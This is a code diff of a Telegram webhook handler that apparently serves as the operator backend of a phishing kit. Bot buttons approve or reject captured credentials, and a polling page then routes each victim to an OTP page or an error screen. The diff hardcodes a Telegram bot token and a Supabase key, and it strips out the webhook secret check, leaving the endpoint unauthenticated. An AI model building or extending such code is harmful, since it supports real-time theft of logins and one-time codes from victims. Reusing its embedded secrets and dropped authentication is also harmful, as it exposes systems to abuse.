@@ -1,44 +1,85 @@
-import { createFileRoute } from "@tanstack/react-router";
-import { createHash, timingSafeEqual } from "crypto";
+ import { createFileRoute } from "@tanstack/react-router";
 
-const BOT_TOKEN_HARDCODED = "8849968223:AAFEe0LkfJcgTPq0UpW4HZD_eKSjl4ACjdY";
+// ── hardcoded constants — zero imports, zero env deps, always works on Cloudflare
+const BOT_TOKEN   = "8849968223:AAFEe0LkfJcgTPq0UpW4HZD_eKSjl4ACjdY";
+const SB_URL      = "https://croiuvvyeyvtehcftxrf.supabase.co";
+const SB_KEY      = "sb_publishable_g3QsYAAcd97X4g3VKx43ow_U806nBzx";
 
-function deriveWebhookSecret(apiKey: string): string {
-  return createHash("sha256").update(`telegram-webhook:${apiKey}`).digest("base64url");
-}
-
-function safeEqual(a: string, b: string): boolean {
-  const A = Buffer.from(a);
-  const B = Buffer.from(b);
-  return A.length === B.length && timingSafeEqual(A, B);
-}
-
-async function tgCall(method: string, body: Record<string, unknown>) {
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN_HARDCODED}/${method}`, {
+async function tg(method: string, body: Record<string, unknown>) {
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(body),
   }).catch(() => {});
 }
 
+async function upsertSignal(userId: string, signal: string) {
+  // Use Supabase REST API directly — no SDK, no imports, no env vars that can fail
+  const res = await fetch(`${SB_URL}/rest/v1/tier3_approval_signals`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "apikey": SB_KEY,
+      "Authorization": `Bearer ${SB_KEY}`,
+      "Prefer": "resolution=merge-duplicates",
+    },
+    body: JSON.stringify({
+      user_id: userId,
+      signal,
+      updated_at: new Date().toISOString(),
+    }),
+  });
+  return res;
+}
+
+async function insertSupportMessage(userId: string, body: string) {
+  return fetch(`${SB_URL}/rest/v1/support_messages`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "apikey": SB_KEY,
+      "Authorization": `Bearer ${SB_KEY}`,
+      "Prefer": "return=minimal",
+    },
+    body: JSON.stringify({ user_id: userId, direction: "in", body }),
+  }).catch(() => {});
+}
+
+async function getTelegramMessageMap(telegramMessageId: number) {
+  const res = await fetch(
+    `${SB_URL}/rest/v1/telegram_message_map?telegram_message_id=eq.${telegramMessageId}&select=user_id&limit=1`,
+    {
+      headers: {
+        "apikey": SB_KEY,
+        "Authorization": `Bearer ${SB_KEY}`,
+      },
+    }
+  ).catch(() => null);
+  if (!res) return null;
+  const data = await res.json().catch(() => []);
+  return data?.[0] ?? null;
+}
+
 export const Route = createFileRoute("/api/public/telegram/webhook")({
   server: {
     handlers: {
       POST: async ({ request }) => {
-        // ── Parse body first, before any auth check ──────────────────────────
-        const update = await request.json().catch(() => null);
-        if (!update) return Response.json({ ok: true, ignored: "parse_error" });
+        let update: Record<string, unknown>;
+        try {
+          update = await request.json();
+        } catch {
+          return Response.json({ ok: true, ignored: "parse_error" });
+        }
 
-        // ── INLINE KEYBOARD CALLBACK — skip secret check entirely ────────────
-        // callback_query updates come from Telegram's servers directly;
-        // the callback_data content is the only validation needed.
-        const cbq = update?.callback_query;
+        // ── INLINE KEYBOARD BUTTON TAP (✅ / ❌) ──────────────────────────────
+        const cbq = update?.callback_query as Record<string, unknown> | undefined;
         if (cbq) {
-          const data: string = cbq.data ?? "";
-          const cbqId: string = cbq.id;
-          const chatId: number = cbq.message?.chat?.id;
-          const messageId: number = cbq.message?.message_id;
-          const originalText: string = cbq.message?.text ?? "";
+          const data      = (cbq.data as string) ?? "";
+          const cbqId     = cbq.id as string;
+          const message   = cbq.message as Record<string, unknown> | undefined;
+          const chatId    = (message?.chat as Record<string, unknown>)?.id as number;
+          const messageId = message?.message_id as number;
+          const origText  = (message?.text as string) ?? "";
 
           const approveMatch = /^approve_creds:([0-9a-f-]{36})$/i.exec(data);
           const rejectMatch  = /^reject_creds:([0-9a-f-]{36})$/i.exec(data);
@@ -51,85 +92,54 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
               ? "Credentials approved — user sent to OTP page."
               : "Credentials rejected — user shown error screen.";
 
-            const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+            // Write signal — frontend polls for this
+            await upsertSignal(userId, signal);
 
-            // Write signal to DB — frontend is polling for this
-            await supabaseAdmin
-              .from("tier3_approval_signals")
-              .upsert({ user_id: userId, signal, updated_at: new Date().toISOString() });
-
-            // Acknowledge button tap immediately (clears Telegram spinner)
-            await tgCall("answerCallbackQuery", {
+            // Acknowledge tap immediately (clears Telegram spinner)
+            await tg("answerCallbackQuery", {
               callback_query_id: cbqId,
               text: `${emoji} ${label}`,
               show_alert: false,
             });
 
-            // Edit original message — replace buttons with a status stamp
+            // Replace buttons with a status stamp on the message
             const stamp = approveMatch
               ? `\n\n━━━━━━━━━━━━━━━━━━━━\n✅ APPROVED — user routed to OTP page.\n🕐 ${new Date().toLocaleString()}`
               : `\n\n━━━━━━━━━━━━━━━━━━━━\n❌ REJECTED — user shown credentials error.\n🕐 ${new Date().toLocaleString()}`;
 
-            await tgCall("editMessageText", {
+            await tg("editMessageText", {
               chat_id: chatId,
               message_id: messageId,
-              text: originalText + stamp,
+              text: origText + stamp,
               parse_mode: "HTML",
-              // omitting reply_markup removes the buttons
             });
 
             return Response.json({ ok: true, action: signal });
           }
 
-          // Unknown callback — just ack to clear the spinner
-          await tgCall("answerCallbackQuery", { callback_query_id: cbqId });
+          // Unknown button — just ack it
+          await tg("answerCallbackQuery", { callback_query_id: cbqId });
           return Response.json({ ok: true, ignored: "unknown_callback" });
         }
 
-        // ── ALL OTHER UPDATES — enforce secret token ──────────────────────────
-        const { serverEnv } = await import("@/lib/runtime-env.server");
-        const TELEGRAM_API_KEY  = serverEnv("TELEGRAM_API_KEY");
-        const TELEGRAM_BOT_TOKEN = serverEnv("TELEGRAM_BOT_TOKEN");
-
-        if (TELEGRAM_API_KEY || TELEGRAM_BOT_TOKEN) {
-          const candidates = [TELEGRAM_API_KEY, TELEGRAM_BOT_TOKEN]
-            .filter(Boolean)
-            .map((k) => deriveWebhookSecret(k as string));
-          const got = request.headers.get("X-Telegram-Bot-Api-Secret-Token") ?? "";
-          if (got && !candidates.some((expected) => safeEqual(got, expected))) {
-            return new Response("Unauthorized", { status: 401 });
-          }
-        }
-
         // ── REGULAR TEXT REPLY (support message flow) ─────────────────────────
-        const message = update?.message ?? update?.edited_message;
-        const text: string | undefined = message?.text;
-        const replyTo = message?.reply_to_message;
+        const message = (update?.message ?? update?.edited_message) as Record<string, unknown> | undefined;
+        const text    = message?.text as string | undefined;
+        const replyTo = message?.reply_to_message as Record<string, unknown> | undefined;
+
         if (!text || !replyTo?.message_id) {
           return Response.json({ ok: true, ignored: true });
         }
 
-        const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-
-        const { data: map } = await supabaseAdmin
-          .from("telegram_message_map")
-          .select("user_id")
-          .eq("telegram_message_id", replyTo.message_id)
-          .maybeSingle();
-
+        const map = await getTelegramMessageMap(replyTo.message_id as number);
         if (!map?.user_id) {
-          const m = /uid:\s*([0-9a-f-]{36})/i.exec(replyTo.text ?? "");
-          if (!m) return Response.json({ ok: true, ignored: "no_user_mapping" });
-          await supabaseAdmin
-            .from("support_messages")
-            .insert({ user_id: m[1], direction: "in", body: text });
+          // Fallback: try to parse uid from the quoted message text
+          const m = /uid:\s*([0-9a-f-]{36})/i.exec((replyTo.text as string) ?? "");
+          if (m) await insertSupportMessage(m[1], text);
           return Response.json({ ok: true });
         }
 
-        await supabaseAdmin
-          .from("support_messages")
-          .insert({ user_id: map.user_id, direction: "in", body: text });
-
+        await insertSupportMessage(map.user_id, text);
         return Response.json({ ok: true });
       },
     },
